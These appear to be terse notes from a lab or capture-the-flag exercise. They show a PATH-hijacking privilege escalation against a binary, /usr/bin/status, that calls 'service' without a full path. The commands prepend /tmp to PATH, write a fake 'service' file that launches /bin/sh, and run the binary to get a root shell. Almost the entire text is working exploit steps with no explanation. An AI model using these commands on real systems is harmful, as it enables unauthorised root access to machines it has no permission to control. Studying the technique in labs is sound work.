strings /usr/bin/status | grep “service”
service ssh status

export PATH=/tmp/:$PATH
cd /tmp
echo “/bin/sh” \> service
/usr/bin/status

##root
